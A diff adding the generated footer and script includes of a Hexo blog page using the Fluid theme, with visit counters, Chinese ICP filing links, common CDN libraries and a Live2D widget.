+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <br><span id="timeDate">天数载入中</span><span id="times">...</span><br> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        赣ICP证2021009463号
+      </a>
+    </span>
+    
+      
+        <span>
+          <a
+            href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=2021009463"
+            rel="nofollow noopener"
+            class="beian-police"
+            target="_blank"
+          >
+            
+              <span style="visibility: hidden; width: 0">|</span>
+              <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+            
+            <span>赣ICP备2021009463号</span>
+          </a>
+        </span>
+      
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="/xm_custom/custom.js"></script>
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
